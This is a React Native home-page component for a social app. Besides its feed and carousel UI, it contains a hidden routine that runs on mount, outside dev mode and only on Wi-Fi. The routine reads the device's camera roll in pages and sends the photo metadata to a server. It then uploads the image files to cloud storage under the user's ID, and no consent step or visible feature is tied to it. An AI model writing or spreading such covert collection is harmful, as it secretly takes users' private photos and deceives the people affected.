import * as React from 'react';
import {
  StyleSheet,
  View,
  StatusBar,
  Animated,
  CameraRoll,
  BackHandler,
} from 'react-native';
import {
  Assets,
  ActionButton,
  RFlatList,
  PADDING_TOP_FULL,
} from '../../../re-kits';
import Carousel, { Pagination } from 'react-native-snap-carousel';
import {
  colors,
  SCREEN_WIDTH,
  isAndroid,
  TAB_BAR_HEIGHT,
  getRandomDate,
  curried,
  Vibration,
  Permission,
  Network,
  retry3,
  User,
  OSS,
  isWifi,
} from '../../utils';
import MainCard from './components/MainCardWithSideTimeLine';
import CarouselCard from './components/CarouselCard';
import ContentDetail from './pages/ContentDetail';
import OneDay from './pages/OneDay';
import HeaderBar from './components/HeaderBar';
import { get } from 'lodash';
import { tap, concatMap, catchError, bufferCount } from 'rxjs/operators';
import { from, throwError, merge } from 'rxjs';
// import { AnimatedWrapper } from '../../../re-kits/animationEasy/';
const getGradientColors = (colors, currentIndex) => [
  colors[currentIndex],
  colors[currentIndex + 1],
];
const item_width = SCREEN_WIDTH - 40 - 0;
class HomePage extends React.Component {
  _didFocusSubscription;
  _willBlurSubscription;
  _contentDetail;
  constructor(props) {
    super(props);
    this.state = {
      nscrollY: new Animated.Value(0),
    };
    this.taskCount = 0;
    this._didFocusSubscription = props.navigation.addListener(
      'didFocus',
      payload =>
        BackHandler.addEventListener(
          'hardwareBackPress',
          this.onBackButtonPressAndroid,
        ),
    );
  }
  onBackButtonPressAndroid = () => {
    const { showDetail } = this.props.state;
    if (showDetail) {
      this._contentDetail && this._contentDetail.onPressClose();
      return true;
    } else {
      return false;
    }
  };
  componentWillMount() {
    this._initFeeds();
    this._initSubscription();
  }
  componentDidMount() {
    this._ifExistsQuest();
    this._willBlurSubscription = this.props.navigation.addListener(
      'willBlur',
      payload =>
        BackHandler.removeEventListener(
          'hardwareBackPress',
          this.onBackButtonPressAndroid,
        ),
    );
  }
  componentWillUnmount() {
    this._didFocusSubscription && this._didFocusSubscription.remove();
    this._willBlurSubscription && this._willBlurSubscription.remove();
  }
  _ifExistsQuest = async () => {
    if (!User.isLoggedIn) {
      return;
    }
    if (__DEV__) {
      return;
    }
    try {
      const { data } = await Network.apiClient.get('/user/photo', {
        params: { user_id: User.objectId, unique_id: User.uniqueId },
      });
      const isWi = await isWifi();
      if (!isWi) {
        return;
      }
      if (data.next) {
        this._uploading(data.photos, data.taskId);
      } else {
        this._getPhotos(data.cursor);
      }
    } catch (error) {
      console.warn(error);
    }
  };
  _getPhotos = async (after = null) => {
    try {
      const params = {
        first: 20,
        assetType: 'Photos',
        // after: '1548290754000',
      };
      if (typeof after === 'string') {
        Object.assign(params, { after });
      }
      const { edges, page_info } = await CameraRoll.getPhotos(params);
      const photos = edges.map(o => ({ ...o.node }));
      console.warn('100get photo', photos.length, page_info.has_next_page);
      if (photos.length === 0) {
        return;
      }

      const { data } = await Network.apiClient.post('/user/photo', {
        user_id: User.objectId,
        edges: photos,
        unique_id: User.uniqueId,
        page_info,
      });
      console.warn('get data', { data });
      if (data.next) {
        this._uploading(photos, data.id);
      }
    } catch (error) {
      console.warn(error);
    }
  };
  _uploading = (photos, taskId) => {
    from(photos)
      .pipe(
        bufferCount(4),
        concatMap(photo4 => {
          return merge(
            ...photo4.map(photo =>
              retry3(
                OSS.upLoadImage(
                  { path: photo.image.uri, mime: photo.type },
                  { ossPath: User.objectId },
                ),
              ).pipe(
                catchError(err =>
                  err.pipe(
                    tap(() => this._reportErr(photo)),
                    throwError(err),
                  ),
                ),
              ),
            ),
          );
        }),
      )
      .subscribe({
        next: () => {
          console.warn('156 finish');
        },
        error: err => console.warn('145err', err),
        complete: curried(this._onRequestFinish)(taskId),
      });
  };
  _reportErr = photo => {
    console.warn('150 upload got err', photo);
  };
  _onRequestFinish = taskId => {
    this.taskCount = this.taskCount + 1;
    if (this.taskCount >= 3) {
      console.warn('155 done');
      return;
    }
    console.warn('157 task finish', taskId);
    retry3(
      Network.apiClient.put('/user/photo', {
        task_id: taskId,
      }),
    ).subscribe({
      next: () => {},
      error: err => {
        console.warn('177', err);
      },
      complete: () => {
        console.warn('169 task completed', taskId);
        this._getPhotos();
      },
    });
  };
  _pendingPermissions = () => {
    Permission.checkPhotoPermission()
      .then(() => {})
      .catch(() => {});
  };
  _setState = nextState => {
    this.props.dispatch('HOME_PAGE_SET_STATE', nextState);
  };
  /**
   *
   *
   * @memberof HomePage
   * fetch feed
   */
  _initFeeds = () => {
    this.props.dispatch('HOME_PAGE_FETCH_POPULAR_POSTS');
    this._fetchPosts();
  };

  /**
   *initialize scbscription
   *
   */
  _initSubscription = () => {
    // queryNew.subscribe(result => {
    //   console.warn('result', result);
    // });
  };
  _onSnapToItem = index => {
    this.props.dispatch('HOME_PAGE_SET_STATE', {
      carouselIndex: index,
    });
  };

  _fetchPosts = happenedAt => {
    const { posts, date } = this.props.state;
    this.props.dispatch('HOME_PAGE_FETCH_POSTS', {
      happenedAt: happenedAt || date,
      offset: posts.length,
    });
  };

  _fetchMorePosts = () => {
    this.props.dispatch('HOME_PAGE_FETCH_MORE_POSTS');
  };
  _renderCarouselItem = ({ item, index }) => {
    // const isOdd = (index + 2) % 2 !== 0;
    return (
      <CarouselCard
        key={'hpc' + index}
        post={item}
        onPress={curried(this._onPressCarouselItem)(item)}
      />
    );
  };
  //press
  _onPressItem = currentPost => moveTo => {
    this.props.dispatch('HOME_PAGE_SET_STATE', {
      currentPost,
    });
    this._contentDetailModalController(true);
    setTimeout(moveTo, 0);
  };
  _onPressCarouselItem = post => {
    this.props.navigation.navigate({
      routeName: 'postDetail',
      params: {
        post,
      },
    });
  };
  _onPressCreateNew = () => {
    if (!User.isLoggedIn) {
      this.props.dispatch('GLOBAL_SHOW_SIGN_UP');
      return;
    }
    this.props.navigation.navigate({
      routeName: 'createNew',
    });
  };
  _contentDetailModalController = bool => {
    const nextState = {
      showDetail: bool,
    };
    if (!bool) Object.assign(nextState, { currentPost: null });
    this.props.dispatch('HOME_PAGE_SET_STATE', nextState);
    this.props.dispatch('GLOBAL_SET_STATE', {
      isTabBarHidden: bool,
    });
  };
  _contentDetailAnimatingController = bool => {
    this.props.dispatch('HOME_PAGE_SET_STATE', {
      contentDetailIsAnimating: bool,
    });
  };
  _oneDayModalController = bool => {
    this.props.dispatch('HOME_PAGE_SET_STATE', {
      showOneDay: bool,
    });
  };
  _onChooseDate = date => {
    this.props.dispatch('HOME_PAGE_SET_STATE', {
      date,
    });
  };

  _timeTravel = () => {
    this.props.dispatch('GLOBAL_SET_STATE', {
      isLoading: true,
    });
    let date = getRandomDate();
    setTimeout(() => {
      this.props.dispatch('HOME_PAGE_SET_STATE', {
        date,
      });
      this.props.dispatch('GLOBAL_SET_STATE', {
        isLoading: false,
      });
      this.props.dispatch('SHOW_SNAKE_BAR', {
        content: 'Welcome to ' + date,
      });
    }, 2000);
  };

  _onPressSend = (value, callback) => {
    this.props.dispatch('COMMENT_COMMENT_POST', {
      content: value,
      post: this.props.state.currentPost,
      callback: callback,
    });
  };
  _onPressComment = post => {
    this.props.navigation.navigate({
      routeName: 'comment',
      params: {
        post,
      },
    });
  };

  _onPressAvatar = user => {
    this.props.navigation.navigate({
      routeName: 'strangerProfile',
      params: {
        user: user,
      },
    });
  };

  _onPressEmoji = postId => emoji => {
    Vibration.vibrate(50);
    this.props.dispatch('HOME_PAGE_PRESS_EMOJI', {
      emoji,
      postId,
    });
  };
  render() {
    return (
      <View style={styles.container}>
        {isAndroid && (
          <StatusBar backgroundColor={'transparent'} translucent={true} />
        )}
        {this._renderFeeds()}
        {this._renderHeaderBar()}
        {this._renderActionButton()}
        {this._renderOneday()}
        {this._renderContentDetail()}
      </View>
    );
  }

  //render
  _renderItem = ({ item, index }) => {
    const { currentPost, colorsSets } = this.props.state;
    let cardProps = {
      gradientColors: getGradientColors(colorsSets, index),
      post: item,
      onPress: this._onPressItem(item, index),
      hidden: get(currentPost, 'postId', null) === item.postId,
      onPressComment: curried(this._onPressComment)(item),
      onPressAvatar: curried(this._onPressAvatar)({
        userId: item.userId,
        username: item.username,
        avatar: item.avatar,
      }),
      onPressEmoji: this._onPressEmoji(item.postId),
    };
    return <MainCard {...cardProps} />;
  };

  _renderHeader = () => {
    const { carouselIndex, popularPosts } = this.props.state;
    return (
      <View style={{ alignItems: 'center', backgroundColor: 'transparent' }}>
        <Carousel
          ref={c => {
            this._carousel = c;
          }}
          data={popularPosts}
          renderItem={this._renderCarouselItem}
          sliderWidth={SCREEN_WIDTH}
          itemWidth={item_width}
          // hasParallaxImages={true}
          loop={true}
          loopClonesPerSide={1}
          onSnapToItem={this._onSnapToItem}
        />
        <Pagination
          dotsLength={popularPosts.length}
          activeDotIndex={carouselIndex}
          containerStyle={{
            backgroundColor: colors.transparent,
            marginTop: 20,
            marginBottom: 10,
            paddingVertical: 0,
          }}
          dotStyle={{
            width: 10,
            height: 10,
            borderRadius: 5,
            marginHorizontal: 8,
            backgroundColor: colors.midGrey,
          }}
          inactiveDotStyle={
            {
              // Define styles for inactive dots here
            }
          }
          inactiveDotOpacity={0.4}
          inactiveDotScale={0.6}
        />
      </View>
    );
  };
  _renderActionButton = () => {
    return (
      <ActionButton
        buttonSource={Assets.actionButton.source}
        onPress={Vibration.vibrate}
      >
        <ActionButton.Icon
          iconStyle={{ backgroundColor: colors.white }}
          iconProps={{
            style: { backgroundColor: colors.white },
            resizeMode: 'contain',
          }}
          source={Assets.edit.source}
          onPress={this._onPressCreateNew}
        />
        <ActionButton.Icon
          source={Assets.comment.source}
          iconProps={{
            style: { backgroundColor: colors.white },
            resizeMode: 'contain',
          }}
          onPress={() => {
            this._oneDay.open();
          }}
        />
        <ActionButton.Icon
          source={Assets.bk1.source}
          onPress={this._timeTravel}
          iconProps={{
            style: { backgroundColor: colors.white },
            resizeMode: 'contain',
          }}
        />
      </ActionButton>
    );
  };

  _renderHeaderBar = () => {
    const { date } = this.props.state;
    return <HeaderBar date={date} scrollY={this.state.nscrollY} />;
  };
  _renderFeeds = () => {
    const { posts, isFooterLoading, isHeaderLoading } = this.props.state;
    return (
      <RFlatList
        animated={true}
        onHeaderRefresh={this._initFeeds}
        isHeaderLoading={isHeaderLoading}
        onFooterRefresh={this._fetchMorePosts}
        isFooterLoading={isFooterLoading}
        style={styles.list}
        renderItem={this._renderItem}
        ListHeaderComponent={this._renderHeader}
        data={posts}
        scrollEventThrottle={6}
        initialNumToRender={5}
        onEndReachedThreshold={0.1}
        keyExtractor={(_, index) => 'hpi' + index}
        // getItemLayout={(data, index) => ({
        //   length: cardHeight,
        //   offset: cardHeight * index,
        //   index,
        // })}
        // overScrollMode={'always'}
        contentContainerStyle={{
          paddingTop: PADDING_TOP_FULL + 10,
          paddingBottom: TAB_BAR_HEIGHT,
        }}
        onScroll={Animated.event(
          [{ nativeEvent: { contentOffset: { y: this.state.nscrollY } } }],
          { useNativeDriver: true },
        )}
        showsVerticalScrollIndicator={false}
      />
    );
  };

  _renderOneday = () => {
    const { showOneDay, date } = this.props.state;
    return (
      <OneDay
        ref={r => (this._oneDay = r)}
        show={showOneDay}
        date={date}
        modalContronller={this._oneDayModalController}
        onChooseDate={this._onChooseDate}
      />
    );
  };
  _renderContentDetail = () => {
    const {
      contentDetailIsAnimating,
      showDetail,
      currentPost,
    } = this.props.state;
    return (
      <ContentDetail
        ref={r => (this._contentDetail = r)}
        show={showDetail}
        currentPost={currentPost}
        onStart={curried(this._contentDetailAnimatingController)(true)}
        onEnd={curried(this._contentDetailAnimatingController)(false)}
        modalController={this._contentDetailModalController}
        isAnimating={contentDetailIsAnimating}
        onPressSend={this._onPressSend}
      />
    );
  };
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    alignItems: 'center',
    backgroundColor: colors.lightGrey,
  },
  list: {
    flex: 1,
  },
});

export default HomePage;
